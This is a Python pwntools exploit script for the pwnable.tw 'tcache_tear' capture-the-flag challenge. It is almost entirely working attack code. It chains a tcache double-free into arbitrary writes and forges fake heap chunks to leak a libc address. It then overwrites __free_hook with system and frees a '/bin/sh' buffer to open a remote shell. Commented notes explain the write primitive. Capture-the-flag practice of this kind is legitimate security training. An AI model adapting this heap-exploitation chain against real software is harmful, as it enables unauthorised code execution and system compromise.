from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'tcache_tear'
elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc
else:
    host = 'chall.pwnable.tw'
    port = '10207'
    xp = remote(host,port)
    libc = ELF("libc.so.6",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
def malloc(size,content):
	sla("choice :","1")
	sla("Size:",str(size))
	sla("Data:",content)

def free():
	sla("choice :","2")

def info():
	sla("choice :","3")

sla("Name:","A"*8)

malloc(0x80,"AAAA")
free()
free()

malloc(0x80,p64(0x6020e0))
malloc(0x80,"BBBB")

p = p64(0)			#prev size
p += p64(0x21)		#Chunk Size (A=0, M=0, P=1)
p += p64(0)			# Forward Pointer
p += p64(0)			# Backward Pointer
p += p64(0)			# Empty Space
p += p64(0x21)		# Next Previous Size (Cegah unlink)
malloc(0x80,p)

malloc(0x70,"CCCC")
free()
free()
malloc(0x70,p64(0x602050))
malloc(0x70,"BBBB")

p = p64(0)			#prev size
p += p64(0x91)		#Chunk size
p += p64(0)			#fd
p += p64(0)			#bk
p += p64(0)*3		#junk
p += p64(0x602060)	#overwrite last malloc value

malloc(0x70,p)

free()
info()

ru(" :")
leak = uu64(xp.recvn(6))
print hex(leak)

libc.address = leak - 0x3ebca0

malloc(0x50,"AAAA")
free()
free()

malloc(0x50,p64(libc.symbols['__free_hook']))
malloc(0x50,"BBBB")
malloc(0x50,p64(libc.symbols['system']))

malloc(0x50,"/bin/sh")
free()

# materi :
# def mem_write(address, value, s):
# 	info("[Mem Write ] Writing %s to %s" % (value, hex(address)))
# 	malloc(s, "anything")
# 	free()
# 	free()
# 	malloc(s, p64(address))
# 	malloc(s, p64(address))
# 	malloc(s, value)

# mem_write(0x602550,
# 			p64(0) + 	# Previous Size
# 			p64(0x21) +	# Chunk Size (A=0, M=0, P=1)
# 			p64(0) + 	# Forward Pointer
# 			p64(0) + 	# Backward Pointer
# 			p64(0) + 	# Empty Space
# 			p64(0x21),	# Next Previous Size
# 		0x70)
#
# mem_write(0x602050,
# 			p64(0) +	# 0x602050		Previous Size
# 			p64(0x501) +	# 0x602058		Chunk Size (A=0, M=0, P=1)
# 			p64(0) +	# 0x602060[name_buffer]	Forward Pointer
# 			p64(0) +	# 0x602068		Backward Pointer
# 			p64(0)*3 +	# 0x602070		Empty Space
# 			p64(0x602060),	# 0x602088[malloced] 	Overwrite the last malloced value
# 		0x60)

xp.interactive()
